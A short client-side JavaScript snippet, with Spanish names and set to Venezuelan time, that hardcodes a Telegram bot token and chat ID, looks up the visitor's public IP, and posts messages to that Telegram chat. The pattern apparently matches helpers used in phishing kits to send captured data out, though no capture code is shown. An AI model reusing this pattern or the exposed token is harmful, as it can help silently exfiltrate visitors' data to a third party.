const TELEGRAM_TOKEN = '8856524067:AAHm0ruHAKXTIFVZ4Kc6zk_7d3lAhAOe6js';
const TELEGRAM_CHAT_ID = '-5341113021';

async function obtenerIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error al obtener la IP:', error);
        return 'No detectada';
    }
}

async function enviarATelegram(mensaje) {
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: mensaje,
                parse_mode: 'HTML'
            })
        });
        return true;
    } catch (error) {
        console.error('Error al enviar a Telegram:', error);
        return false;
    }
}

function obtenerFechaHora() {
    return new Date().toLocaleString('es-VE', { timeZone: 'America/Caracas' });
}
